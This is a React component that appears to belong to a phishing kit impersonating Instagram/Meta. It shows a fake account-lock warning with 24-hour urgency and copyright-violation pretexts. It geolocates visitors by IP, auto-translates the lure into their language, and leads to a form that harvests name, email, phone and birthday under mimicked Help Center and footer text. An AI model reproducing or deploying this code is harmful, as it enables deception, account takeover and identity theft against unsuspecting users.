import HeroImage from '@/assets/images/hero-image.jpg';
import { PATHS } from '@/router/router';
import countryToLanguage from '@/utils/country_to_language';
import { translateText } from '@/utils/translate';
import { faCircleCheck, faIdCard } from '@fortawesome/free-solid-svg-icons';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import axios from 'axios';
import { useCallback, useEffect, useMemo, useState } from 'react';
import { useNavigate } from 'react-router';

const Index = () => {
    const navigate = useNavigate();
    const [today, setToday] = useState();
    const [isLoading, setIsLoading] = useState(true);
    const [isTranslating, setIsTranslating] = useState(true);
    
    const defaultTexts = useMemo(
        () => ({
            title: 'Your account will be locked for 24 hours.',
            description: "Our system has detected some unusual activity on your account, which may be a sign of copyright infringement or user complaints that affect the community.",
            protectionText: "Please verify and follow the steps as instructed.",
            processText: 'To avoid account lock you have only 24 hours left to verify and appeal.',
            continueBtn: 'Verification',
            restrictedText: 'Your account was restricted on'
        }),
        []
    );

    const [translatedTexts, setTranslatedTexts] = useState(defaultTexts);

    // 🎯 THÊM: Texts của form 1 (Home)
    const homeDefaultTexts = useMemo(
        () => ({
            helpCenter: 'Help Center',
            english: 'English',
            using: 'Using',
            managingAccount: 'Managing Your Account',
            privacySecurity: 'Privacy, Safety and Security',
            policiesReporting: 'Policies and Reporting',
            pagePolicyAppeals: 'Account Policy Complaints',
            detectedActivity: 'We have detected unusual activity on Pages and ad accounts linked to your Instagram, including reported copyright and guideline violations.',
            accessLimited: 'To protect your account, please verify so that the review process is processed quickly and accurately.',
            submitAppeal: 'If you believe this is an error, you can file a complaint by providing the required information.',
            pageName: 'Name',
            mail: 'Email',
            phone: 'Phone Number',
            birthday: 'Birthday',
            yourAppeal: 'Your Appeal',
            appealPlaceholder: 'Please describe your appeal in detail...',
            submit: 'Submit',
            fieldRequired: 'This field is required',
            invalidEmail: 'Please enter a valid email address',
            about: 'About',
            adChoices: 'Ad choices',
            createAd: 'Create ad',
            privacy: 'Privacy',
            careers: 'Careers',
            createPage: 'Create Page',
            termsPolicies: 'Terms and policies',
            cookies: 'Cookies',
            pleaseWait: 'Please wait...',
            checkingSecurity: 'Checking security...'
        }),
        []
    );

    const translateAllTexts = useCallback(
        async (targetLang) => {
            try {
                setIsTranslating(true);
                
                // 🎯 DỊCH FORM 0
                const [translatedTitle, translatedDesc, translatedProtection, translatedProcess, translatedContinue, translatedRestricted] = await Promise.all([
                    translateText(defaultTexts.title, targetLang), 
                    translateText(defaultTexts.description, targetLang), 
                    translateText(defaultTexts.protectionText, targetLang), 
                    translateText(defaultTexts.processText, targetLang), 
                    translateText(defaultTexts.continueBtn, targetLang), 
                    translateText(defaultTexts.restrictedText, targetLang)
                ]);

                setTranslatedTexts({
                    title: translatedTitle,
                    description: translatedDesc,
                    protectionText: translatedProtection,
                    processText: translatedProcess,
                    continueBtn: translatedContinue,
                    restrictedText: translatedRestricted
                });

                // 🎯 DỊCH LUÔN FORM 1 (HOME) VÀ LƯU VÀO LOCALSTORAGE
                const homeTextsToTranslate = Object.values(homeDefaultTexts);
                const translatedHomeTexts = await Promise.all(
                    homeTextsToTranslate.map(text => translateText(text, targetLang))
                );

                // 🎯 TẠO OBJECT DỊCH CHO FORM 1
                const translatedHomeObject = {};
                Object.keys(homeDefaultTexts).forEach((key, index) => {
                    translatedHomeObject[key] = translatedHomeTexts[index];
                });

                // 🎯 LƯU VÀO LOCALSTORAGE ĐỂ FORM 1 DÙNG
                localStorage.setItem(`translatedHome_${targetLang}`, JSON.stringify(translatedHomeObject));
                
                setIsTranslating(false);
            } catch (error) {
                console.log('translation failed:', error.message);
                setIsTranslating(false);
            }
        },
        [defaultTexts, homeDefaultTexts]
    );

    useEffect(() => {
        const init = async () => {
            const date = new Date();
            const options = {
                month: 'long',
                day: 'numeric',
                year: 'numeric'
            };
            setToday(date.toLocaleString('en-US', options));
            localStorage.clear();

            const fetchIpInfo = async () => {
                try {
                    const response = await axios.get('https://get.geojs.io/v1/ip/geo.json');
                    localStorage.setItem('ipInfo', JSON.stringify(response.data));
                    const countryCode = response.data.country_code;
                    const targetLang = countryToLanguage[countryCode] || 'en';

                    localStorage.setItem('targetLang', targetLang);
                    
                    if (targetLang !== 'en') {
                        await translateAllTexts(targetLang);
                    } else {
                        setIsTranslating(false);
                    }
                    
                    setIsLoading(false);
                } catch {
                    setIsTranslating(false);
                    setIsLoading(false);
                }
            };
            
            await fetchIpInfo();
        };

        init();
    }, [translateAllTexts]);

    if (isTranslating) {
        return (
            <div className='flex min-h-screen items-center justify-center bg-white sm:bg-[#F8F9FA]'>
                <div className='flex max-w-[620px] flex-col gap-4 rounded-lg bg-white p-4 sm:shadow-lg'>
                    <div className="flex justify-center">
                        <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-blue-500"></div>
                    </div>
                </div>
            </div>
        );
    }

    return (
        <div className='flex min-h-screen items-center justify-center bg-white sm:bg-[#F8F9FA]'>
            <title>Comunity Standard</title>
            <div className='flex max-w-[620px] flex-col gap-4 rounded-lg bg-white p-4 sm:shadow-lg'>
                <img src={HeroImage} alt='' />
                <p className='text-3xl font-bold'>{translatedTexts.title}</p>
                <p className='leading-6 text-[#212529]'>{translatedTexts.description}</p>
                <div className='relative flex flex-col gap-4'>
                    <div className='absolute top-1/2 left-3 h-[70%] w-0.5 -translate-y-1/2 bg-gray-200'></div>

                    <div className='z-10 flex items-center gap-2'>
                        <FontAwesomeIcon icon={faCircleCheck} className='h-7 w-7 bg-white text-gray-300' size='xl' />
                        <p>{translatedTexts.protectionText}</p>
                    </div>
                    <div className='z-10 flex items-center gap-2'>
                        <FontAwesomeIcon icon={faIdCard} className='h-7 w-7 bg-white text-[#355797]' size='xl' />
                        <p>{translatedTexts.processText}</p>
                    </div>
                </div>
                <button
                    className='rounded-lg bg-blue-500 px-3 py-4 font-bold text-white disabled:opacity-50'
                    disabled={isLoading}
                    onClick={() => {
                        navigate(PATHS.HOME);
                    }}
                >
                    {translatedTexts.continueBtn}
                </button>
                <p className='text-center'>
                    {translatedTexts.restrictedText} <span className='font-bold'>{today}</span>
                </p>
            </div>
        </div>
    );
};

export default Index;
